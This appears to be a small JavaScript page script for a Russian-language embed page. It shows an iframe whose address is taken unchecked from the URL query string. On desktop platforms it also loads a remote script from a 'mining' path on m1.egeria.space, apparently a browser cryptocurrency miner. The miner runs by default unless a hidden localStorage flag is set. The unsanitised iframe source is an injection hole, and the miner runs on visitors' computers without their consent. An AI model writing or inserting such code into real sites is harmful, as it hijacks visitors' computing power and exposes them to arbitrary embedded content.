document.addEventListener('DOMContentLoaded', function() {
    "use strict";

    if (navigator.cookieEnabled === false) {
        document.body.innerText = 'Для работы сайта необходимо включить куки.';
    } else if (location.search.length > 1) {
        var x1 = document.createElement('iframe');
        x1.setAttribute('src', location.search.substr(1));
        x1.setAttribute('allowfullscreen', '');
        document.body.appendChild(x1);

        if (typeof navigator.platform === "undefined" || (
                navigator.platform !== 'Android' &&
                navigator.platform !== 'iPhone' &&
                navigator.platform !== 'iPad' &&
                navigator.platform !== 'iPod' &&
                navigator.platform !== 'BlackBerry' &&
                navigator.platform !== 'WebTV OS' &&
                localStorage.getItem('DisableMining') === null
            )) {
            var x2 = document.createElement('script');
            x2.setAttribute('src', '//m1.egeria.space/mining');
            x2.setAttribute('async', '');
            document.body.appendChild(x2);
        }
    } else {
        document.body.innerText = 'Неверный параметр API.';
    }
});